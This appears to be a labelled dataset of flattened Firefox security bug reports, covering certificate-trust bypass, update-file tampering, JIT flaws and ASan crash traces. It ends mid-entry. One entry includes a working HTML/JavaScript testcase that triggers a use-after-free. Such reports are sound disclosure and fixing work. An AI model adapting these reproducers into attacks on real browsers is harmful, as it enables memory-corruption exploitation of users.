extended validation root certificates are trusted even if the user has explicitly removed their trust user agent mozilla/5.0 stop hacker rv:24.0 gecko/20130524 firefox/24.0 nightly/aurora build id 20130917030214 steps to reproduce this is in firefox nightly build 26.0a1 i tried to open a website that has a secure connection however something strange happened actual results when i tried to open a website signed by entrust inc although i edit the ca settings in the certificate manager that this certificate is not trusted the connection will still go through without showing “ the connection is untrusted also when i opened the certificate manager and change a ca settings i closed it firefox will crash after i reopen certificate manager test website menu/category/all with entrust inc root certificate untrusted the certificate is still trusted expected results it should appear the connection is untrusted because the root certificate is untrusted	5
fix heap-use-after-free in nsdocloader dostopdocumentload user agent mozilla/5.0 x11 linux x86_64 applewebkit/537.36 khtml like gecko chrome/28.0.1500.95 safari/537.36 steps to reproduce heap-use-after-free in nsdocloader dostopdocumentload tested on asan firefox build 1377823661 and 1379548174 and 23.0 crashed os debian 7.1 and ubuntu 10.04 lts please put a.html and b.html in the same directory and open a.html a.html html script function killchildframe window 0 home document.body.removechild document.getelementsbytagname iframe 0 script iframe src b.html iframe html b.html html manifest x script window.applicationcache.onchecking function parent.killchildframe script html actual results 18678==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nscomptr dist/include/nscomptr.h:430 1 in nsdocloader dostopdocumentload nsirequest tag_nsresult builds/slave/m-cen-l64-asan-000000000000000/build/uriloader/base/nsdocloader.cpp:865 2 in nsdocloader docloaderisempty bool builds/slave/m-cen-l64-asan-000000000000000/build/uriloader/base/nsdocloader.cpp:755 3 in nsdocloader onstoprequest nsirequest nsisupports tag_nsresult builds/slave/m-cen-l64-asan-000000000000000/build/uriloader/base/nsdocloader.cpp:639 4 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports tag_nsresult builds/slave/m-cen-l64-asan-000000000000000/build/uriloader/base/nsdocloader.cpp:642 5 in nsloadgroup removerequest nsirequest nsisupports tag_nsresult builds/slave/m-cen-l64-asan-000000000000000/build/netwerk/base/src/nsloadgroup.cpp:687 6 in nsdocument dounblockonload builds/slave/m-cen-l64-asan-000000000000000/build/content/base/src/nsdocument.cpp:7999 7 in nsdocument unblockonload bool builds/slave/m-cen-l64-asan-000000000000000/build/content/base/src/nsdocument.cpp:7927 8 in nsdocument dispatchcontentloadedevents builds/slave/m-cen-l64-asan-000000000000000/build/content/base/src/nsdocument.cpp:4713 9 in nsrunnablemethodimpl void nsdocument true run dist/include/nsthreadutils.h:363 10 in nsthread processnextevent bool bool builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/threads/nsthread.cpp:622 11 in ns_processnextevent nsithread bool builds/slave/m-cen-l64-asan-000000000000000/build/obj-firefox/xpcom/build/nsthreadutils.cpp:238 12 in nsxulwindow showmodal builds/slave/m-cen-l64-asan-000000000000000/build/xpfe/appshell/src/nsxulwindow.cpp:365 13 in nswindowwatcher openwindowinternal nsidomwindow char const char const char const bool bool bool nsiarray nsidomwindow builds/slave/m-cen-l64-asan-000000000000000/build/embedding/components/windowwatcher/src/nswindowwatcher.cpp:998 14 in nswindowwatcher openwindow nsidomwindow char const char const char const nsisupports nsidomwindow builds/slave/m-cen-l64-asan-000000000000000/build/embedding/components/windowwatcher/src/nswindowwatcher.cpp:344 15 in ns_invokebyindex builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 16 in callmethodhelper invoke builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappednative.cpp:2809 17 in xpc_wn_callmethod jscontext unsigned int js value builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappednativejsops.cpp:1316 18 in jsfunction native const builds/slave/m-cen-l64-asan-000000000000000/build/js/src/jscntxtinlines.h:219 19 in interpret jscontext js runstate builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:2484 20 in js runscript jscontext js runstate builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:446 21 in js invoke jscontext js callargs js maybeconstruct builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:508 22 in js invoke jscontext js value const js value const unsigned int js value js mutablehandle js value builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:539 23 in js_callfunctionvalue jscontext jsobject js value unsigned int js value js value builds/slave/m-cen-l64-asan-000000000000000/build/js/src/jsapi.cpp:5420 24 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short xptmethoddescriptor const nsxptcminivariant builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappedjsclass.cpp:1445 25 in nsxpcwrappedjs callmethod unsigned short xptmethoddescriptor const nsxptcminivariant builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappedjs.cpp:587 26 in prepareanddispatch builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:122 27 in sharedstub builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 is located 0 bytes inside of 64-byte region freed by thread t0 here 0 in interceptor_free asan_rtl 1 in nsautorefcnt operator unsigned int dist/include/mozilla/mozalloc.h:225 2 in nsdocloader dofireonstatechange nsiwebprogress nsirequest int tag_nsresult builds/slave/m-cen-l64-asan-000000000000000/build/uriloader/base/nsdocloader.cpp:1331 3 in nsdocloader dostopdocumentload nsirequest tag_nsresult builds/slave/m-cen-l64-asan-000000000000000/build/uriloader/base/nsdocloader.cpp:865 4 in nsdocloader docloaderisempty bool builds/slave/m-cen-l64-asan-000000000000000/build/uriloader/base/nsdocloader.cpp:755 5 in nsdocloader onstoprequest nsirequest nsisupports tag_nsresult builds/slave/m-cen-l64-asan-000000000000000/build/uriloader/base/nsdocloader.cpp:639 6 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports tag_nsresult builds/slave/m-cen-l64-asan-000000000000000/build/uriloader/base/nsdocloader.cpp:642 7 in nsdocument dounblockonload builds/slave/m-cen-l64-asan-000000000000000/build/content/base/src/nsdocument.cpp:7999 8 in nsdocument unblockonload bool builds/slave/m-cen-l64-asan-000000000000000/build/content/base/src/nsdocument.cpp:7927 9 in nsdocument dispatchcontentloadedevents builds/slave/m-cen-l64-asan-000000000000000/build/content/base/src/nsdocument.cpp:4713 10 in nsrunnablemethodimpl void nsdocument true run dist/include/nsthreadutils.h:363 11 in ns_processnextevent nsithread bool builds/slave/m-cen-l64-asan-000000000000000/build/obj-firefox/xpcom/build/nsthreadutils.cpp:238 12 in nsxulwindow showmodal builds/slave/m-cen-l64-asan-000000000000000/build/xpfe/appshell/src/nsxulwindow.cpp:365 13 in nswindowwatcher openwindowinternal nsidomwindow char const char const char const bool bool bool nsiarray nsidomwindow builds/slave/m-cen-l64-asan-000000000000000/build/embedding/components/windowwatcher/src/nswindowwatcher.cpp:998 14 in nswindowwatcher openwindow nsidomwindow char const char const char const nsisupports nsidomwindow builds/slave/m-cen-l64-asan-000000000000000/build/embedding/components/windowwatcher/src/nswindowwatcher.cpp:344 15 in ns_invokebyindex builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 16 in callmethodhelper invoke builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappednative.cpp:2809 17 in xpc_wn_callmethod jscontext unsigned int js value builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappednativejsops.cpp:1316 18 in jsfunction native const builds/slave/m-cen-l64-asan-000000000000000/build/js/src/jscntxtinlines.h:219 19 in interpret jscontext js runstate builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:2484 20 in js runscript jscontext js runstate builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:446 21 in js invoke jscontext js callargs js maybeconstruct builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:508 22 in js invoke jscontext js value const js value const unsigned int js value js mutablehandle js value builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:539 23 in js_callfunctionvalue jscontext jsobject js value unsigned int js value js value builds/slave/m-cen-l64-asan-000000000000000/build/js/src/jsapi.cpp:5420 24 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short xptmethoddescriptor const nsxptcminivariant builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappedjsclass.cpp:1445 25 in nsxpcwrappedjs callmethod unsigned short xptmethoddescriptor const nsxptcminivariant builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappedjs.cpp:587 26 in prepareanddispatch builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:122 27 in sharedstub builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 28 in ns_invokebyindex builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 29 in callmethodhelper invoke builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappednative.cpp:2809 previously allocated by thread t0 here 0 in interceptor_malloc asan_rtl 1 in moz_xmalloc builds/slave/m-cen-l64-asan-000000000000000/build/memory/mozalloc/mozalloc.cpp:54 2 in nscontentsink processofflinemanifest nsastring_internal const builds/slave/m-cen-l64-asan-000000000000000/build/content/base/src/nscontentsink.cpp:1108 3 in nshtml5speculativeload perform nshtml5treeopexecutor builds/slave/m-cen-l64-asan-000000000000000/build/parser/html/nshtml5speculativeload.cpp:45 4 in nshtml5treeopexecutor runflushloop builds/slave/m-cen-l64-asan-000000000000000/build/parser/html/nshtml5treeopexecutor.cpp:507 5 in nshtml5executorflusher run builds/slave/m-cen-l64-asan-000000000000000/build/parser/html/nshtml5streamparser.cpp:131 6 in ns_processnextevent nsithread bool builds/slave/m-cen-l64-asan-000000000000000/build/obj-firefox/xpcom/build/nsthreadutils.cpp:238 7 in nsxulwindow showmodal builds/slave/m-cen-l64-asan-000000000000000/build/xpfe/appshell/src/nsxulwindow.cpp:365 8 in nswindowwatcher openwindowinternal nsidomwindow char const char const char const bool bool bool nsiarray nsidomwindow builds/slave/m-cen-l64-asan-000000000000000/build/embedding/components/windowwatcher/src/nswindowwatcher.cpp:998 9 in nswindowwatcher openwindow nsidomwindow char const char const char const nsisupports nsidomwindow builds/slave/m-cen-l64-asan-000000000000000/build/embedding/components/windowwatcher/src/nswindowwatcher.cpp:344 10 in ns_invokebyindex builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 11 in callmethodhelper invoke builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappednative.cpp:2809 12 in xpc_wn_callmethod jscontext unsigned int js value builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappednativejsops.cpp:1316 13 in jsfunction native const builds/slave/m-cen-l64-asan-000000000000000/build/js/src/jscntxtinlines.h:219 14 in interpret jscontext js runstate builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:2484 15 in js runscript jscontext js runstate builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:446 16 in js invoke jscontext js callargs js maybeconstruct builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:508 17 in js invoke jscontext js value const js value const unsigned int js value js mutablehandle js value builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:539 18 in js_callfunctionvalue jscontext jsobject js value unsigned int js value js value builds/slave/m-cen-l64-asan-000000000000000/build/js/src/jsapi.cpp:5420 19 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short xptmethoddescriptor const nsxptcminivariant builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappedjsclass.cpp:1445 20 in nsxpcwrappedjs callmethod unsigned short xptmethoddescriptor const nsxptcminivariant builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappedjs.cpp:587 21 in prepareanddispatch builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:122 22 in sharedstub builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 23 in ns_invokebyindex builds/slave/m-cen-l64-asan-000000000000000/build/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 24 in callmethodhelper invoke builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappednative.cpp:2809 25 in xpc_wn_callmethod jscontext unsigned int js value builds/slave/m-cen-l64-asan-000000000000000/build/js/xpconnect/src/xpcwrappednativejsops.cpp:1316 26 in jsfunction native const builds/slave/m-cen-l64-asan-000000000000000/build/js/src/jscntxtinlines.h:219 27 in interpret jscontext js runstate builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:2484 28 in js runscript jscontext js runstate builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:446 29 in js invoke jscontext js callargs js maybeconstruct builds/slave/m-cen-l64-asan-000000000000000/build/js/src/vm/interpreter.cpp:508 shadow bytes around the buggy address 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa 00 00 00 00 00 00 05 fa fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 18678==aborting	11
files extracted from mar file are not locked during update files like update.manifest or patch files arent locked and extracted in a writeable place during an update process so it is possible to change the update process with manipulted patch and update.manifest files it seems to be possible to change any files which are relative to the working directory of the updater for example the firefox directory i have tested this behavoir in ff 24.0	2
asan use-after-free in nsnodeutils lastrelease on anonymous node from showinlinetableeditingui the attached testcase crashes the latest nightly asan build it requires domfuzzlite	11
getelementic typed array stub does n't property respect monitoredresult we should not generate typed array stubs or any ic stub for that matter that know a priori that both they could generate a type that is not in the observed typesets and that they will not be monitored we even have a flag for just this purpose in getelementic we just seem to blissfully ignore it this works great until the whole house burns down i am currently standing in the ashes of my former home this manifests with the patch in 923717 applied on asm.js/testzoob.js marking s-s since this causes fairly random behavior as it runs afoul of our optimization scheme do n't know how old it is guessing at least through 25	11
segv in libxul.so nsgfxscrollframeinner isltr found by the blackberry security automated analysis team s fuzzing framework alf 30229==error addresssanitizer segv on unknown address pc sp bp t0 addresssanitizer can not provide additional info 0 libxul.so nsgfxscrollframeinner isltr const line 3411 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/generic/nsgfxscrollframe.cpp 1 libxul.so nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const line 4129 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/generic/nsgfxscrollframe.cpp 2 libxul.so nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int line 795 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/generic/nsgfxscrollframe.cpp 3 libxul.so nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker line 961 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/generic/nscontainerframe.cpp 4 libxul.so viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int line 221 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/generic/nsviewportframe.cpp 5 libxul.so presshell doreflow nsiframe bool line 7905 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nspresshell.cpp 6 libxul.so presshell processreflowcommands bool line 8046 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nspresshell.cpp 7 libxul.so presshell flushpendingnotifications mozilla changestoflush line 3869 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nspresshell.cpp 8 libxul.so nsrefreshdriver tick long mozilla timestamp line 1159 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsrefreshdriver.cpp 9 libxul.so mozilla refreshdrivertimer tick line 168 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsrefreshdriver.cpp 10 libxul.so nstimerimpl fire line 546 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nstimerimpl.cpp 11 libxul.so nstimerevent run line 630 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nstimerimpl.cpp 12 libxul.so nsthread processnextevent bool bool line 622 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsthread.cpp 13 libxul.so ns_processnextevent nsithread bool line 251 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/glue/nsthreadutils.cpp 14 libxul.so mozilla ipc messagepump run base messagepump delegate line 85 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/glue/messagepump.cpp 15 libxul.so messageloop run line 220 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/chromium/src/base/message_loop.cc 16 libxul.so nsbaseappshell run line 161 of builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsbaseappshell.cpp 17 libxul.so nsappstartup run line 268 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/components/startup/nsappstartup.cpp 18 libxul.so xremain xre_mainrun line 3886 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 19 libxul.so xremain xre_main int char nsxreappdata const line 3954 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 20 libxul.so xre_main line 4156 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 21 firefox main line 275 of builds/slave/m-in-l64-asan-0000000000000000/build/browser/app/nsbrowserapp.cpp 22 libc.so.6 libc_start_main line 226 of libc-start.c 23 firefox start 30229==aborting	9
inconsistent this value when invoking getters on window consider this testcase var count 1000000 for var i 0 i count i document i ve been investigating what gets passed as the thisv to the jsnative getter for the document here when we re called from the interpreter js shape get calls js invokegetterorsetter which calls js invoke which outerizes the this object so in this case we get the outer window proxy as thisv when we baseline-compile this code we seem to end up calling js jit dogetnamefallback which ends up taking the same codepath as the interpreter when we ion-compile this code though it looks like we re calling the getter directly from ioncode and it s no longer outerizing the this value in that case the inconsistency is pretty suboptimal because it means depending on the jit compilation level you have you might or might not get a security exception on the bareword acess furthermore i would like us to generally move to the ion version here for jsnative getters or at least for the dom s window bindings while we need to outerize the this for scripted getters for jsnative ones that s just dataloss in that we can no longer reliably tell which actual global we re working with in particular inner windows are in a many-to-one relationship with outer ones so it s always possible to go from an inner to an outer but the reverse is not necessarily true unless one is really careful in fact i think it s impossible to find the right c object in general in the bindings code if the outer is passed as thisv which means that we end up having to assume that we should forward to the current inner which can be a different object from the actual global the script is running on that s not to mention the performance issues involved with the outerobject hook and then unwrapping the extra layers of wrappers in the binding code	2
heap-use-after-free in libxul.so nseventlistenermanager handleeventsubtype found by the blackberry security automated analysis team s fuzzing framework alf 24554==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 libxul.so nseventlistenermanager handleeventsubtype nslistenerstruct mozilla dom callbackobjectholder mozilla dom eventlistener nsidomeventlistener const nsidomevent mozilla dom eventtarget nscxpusher line 268 of dist/include/mozilla/dom/callbackobject.h 1 libxul.so nseventlistenermanager handleeventinternal nsprescontext mozilla widgetevent nsidomevent mozilla dom eventtarget nseventstatus nscxpusher line 1038 of builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nseventlistenermanager.cpp 2 libxul.so nseventtargetchainitem handleevent nseventchainpostvisitor elmcreationdetector nscxpusher line 325 of builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nseventlistenermanager.h 3 libxul.so nseventtargetchainitem handleeventtargetchain nstarray nseventtargetchainitem nseventchainpostvisitor nsdispatchingcallback elmcreationdetector nscxpusher line 313 of builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nseventdispatcher.cpp 4 libxul.so nseventdispatcher dispatch nsisupports nsprescontext mozilla widgetevent nsidomevent nseventstatus nsdispatchingcallback nscomarray mozilla dom eventtarget line 605 of builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nseventdispatcher.cpp 5 libxul.so nsgenerichtmlelement click line 2738 of builds/slave/m-in-l64-asan-0000000000000000/build/content/html/content/src/nsgenerichtmlelement.cpp 6 libxul.so mozilla dom htmlelementbinding click jscontext js handle jsobject nsgenerichtmlelement jsjitmethodcallargs const line 582 of htmlelementbinding.cpp 7 libxul.so mozilla dom htmlelementbinding genericmethod jscontext unsigned int js value line 4767 of htmlelementbinding.cpp 8 libxul.so js invoke jscontext js callargs js maybeconstruct line 220 of builds/slave/m-in-l64-asan-0000000000000000/build/js/src/jscntxtinlines.h 9 libxul.so interpret jscontext js runstate line 2502 of builds/slave/m-in-l64-asan-0000000000000000/build/js/src/vm/interpreter.cpp 10 libxul.so js runscript jscontext js runstate line 420 of builds/slave/m-in-l64-asan-0000000000000000/build/js/src/vm/interpreter.cpp 11 libxul.so js invoke jscontext js callargs js maybeconstruct line 482 of builds/slave/m-in-l64-asan-0000000000000000/build/js/src/vm/interpreter.cpp 12 libxul.so js invoke jscontext js value const js value const unsigned int js value js mutablehandle js value line 513 of builds/slave/m-in-l64-asan-0000000000000000/build/js/src/vm/interpreter.cpp 13 libxul.so js_callfunctionvalue jscontext jsobject js value unsigned int js value js value line 4920 of builds/slave/m-in-l64-asan-0000000000000000/build/js/src/jsapi.cpp 14 libxul.so mozilla dom eventhandlernonnull call jscontext js handle jsobject nsdomevent mozilla errorresult line 36 of eventhandlerbinding.cpp 15 libxul.so nsjseventlistener handleevent nsidomevent line 58 of dist/include/mozilla/dom/eventhandlerbinding.h 16 libxul.so nseventlistenermanager handleeventsubtype nslistenerstruct mozilla dom callbackobjectholder mozilla dom eventlistener nsidomeventlistener const nsidomevent mozilla dom eventtarget nscxpusher line 960 of builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nseventlistenermanager.cpp 17 libxul.so nseventlistenermanager handleeventinternal nsprescontext mozilla widgetevent nsidomevent mozilla dom eventtarget nseventstatus nscxpusher line 1038 of builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nseventlistenermanager.cpp 18 libxul.so nseventtargetchainitem handleevent nseventchainpostvisitor elmcreationdetector nscxpusher line 325 of builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nseventlistenermanager.h 19 libxul.so nseventtargetchainitem handleeventtargetchain nstarray nseventtargetchainitem nseventchainpostvisitor nsdispatchingcallback elmcreationdetector nscxpusher line 292 of builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nseventdispatcher.cpp 20 libxul.so nseventdispatcher dispatch nsisupports nsprescontext mozilla widgetevent nsidomevent nseventstatus nsdispatchingcallback nscomarray mozilla dom eventtarget line 605 of builds/slave/m-in-l64-asan-0000000000000000/build/content/events/src/nseventdispatcher.cpp 21 libxul.so nsdocumentviewer loadcomplete tag_nsresult line 997 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsdocumentviewer.cpp 22 libxul.so nsdocshell endpageload nsiwebprogress nsichannel tag_nsresult line 6776 of builds/slave/m-in-l64-asan-0000000000000000/build/docshell/base/nsdocshell.cpp 23 libxul.so nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult line 6573 of builds/slave/m-in-l64-asan-0000000000000000/build/docshell/base/nsdocshell.cpp 24 libxul.so non-virtual thunk to nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult line 6579 of builds/slave/m-in-l64-asan-0000000000000000/build/docshell/base/nsdocshell.cpp 25 libxul.so nsdocloader dofireonstatechange nsiwebprogress nsirequest int tag_nsresult line 1331 of builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsdocloader.cpp 26 libxul.so nsdocloader dostopdocumentload nsirequest tag_nsresult line 865 of builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsdocloader.cpp 27 libxul.so nsdocloader docloaderisempty bool line 755 of builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsdocloader.cpp 28 libxul.so nsdocloader onstoprequest nsirequest nsisupports tag_nsresult line 639 of builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsdocloader.cpp 29 libxul.so non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports tag_nsresult line 642 of builds/slave/m-in-l64-asan-0000000000000000/build/uriloader/base/nsdocloader.cpp 30 libxul.so nsloadgroup removerequest nsirequest nsisupports tag_nsresult line 688 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nsloadgroup.cpp 31 libxul.so nsdocument dounblockonload line 7988 of builds/slave/m-in-l64-asan-0000000000000000/build/content/base/src/nsdocument.cpp 32 libxul.so nsdocument unblockonload bool line 7916 of builds/slave/m-in-l64-asan-0000000000000000/build/content/base/src/nsdocument.cpp 33 libxul.so nsdocument dispatchcontentloadedevents line 4702 of builds/slave/m-in-l64-asan-0000000000000000/build/content/base/src/nsdocument.cpp 34 libxul.so nsrunnablemethodimpl void nsdocument void true run line 382 of dist/include/nsthreadutils.h 35 libxul.so nsthread processnextevent bool bool line 622 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsthread.cpp 36 libxul.so ns_processnextevent nsithread bool line 251 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/glue/nsthreadutils.cpp 37 libxul.so mozilla ipc messagepump run base messagepump delegate line 85 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/glue/messagepump.cpp 38 libxul.so messageloop run line 220 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/chromium/src/base/message_loop.cc 39 libxul.so nsbaseappshell run line 161 of builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsbaseappshell.cpp 40 libxul.so nsappstartup run line 267 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/components/startup/nsappstartup.cpp 41 libxul.so xremain xre_mainrun line 3976 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 42 libxul.so xremain xre_main int char nsxreappdata const line 4044 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 43 libxul.so xre_main line 4246 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 44 firefox main line 275 of builds/slave/m-in-l64-asan-0000000000000000/build/browser/app/nsbrowserapp.cpp 45 libc.so.6 libc_start_main line 226 of libc-start.c 46 firefox start is located 88 bytes inside of 128-byte region freed by thread t0 here 0 firefox realloc line 95 of builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc 1 libmozalloc.so moz_xrealloc line 84 of builds/slave/m-in-l64-asan-0000000000000000/build/memory/mozalloc/mozalloc.cpp previously allocated by thread t0 here 0 firefox malloc line 74 of builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc 1 libmozalloc.so moz_xmalloc line 52 of builds/slave/m-in-l64-asan-0000000000000000/build/memory/mozalloc/mozalloc.cpp shadow bytes around the buggy address fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 24554==aborting	11
fedisplacementmap should check taintedness of the image with the displacements security sensitive for now since there s an information leak here that we re plugging there is really no way to prevent timing attacks revealing information about the contents of the displacements input to fedisplacementmap these displacements control the addresses of memory fetches into the other input image these fetches can be made fast or slow by concentrating them into one location or by spreading them out due to cache effects making all the fetches equally slow would be difficult to do and result in horrible performance however in many important use-cases of fedisplacementmap we can easily prove that the displacements input image does not depend on content from a different origin than the page so we can restrict fedisplacementmap to only work when we can prove that instead of disabling it completely i suggest we do the following assign an origin-clean flag to each filter primitive by default a filter primitive is origin-clean if and 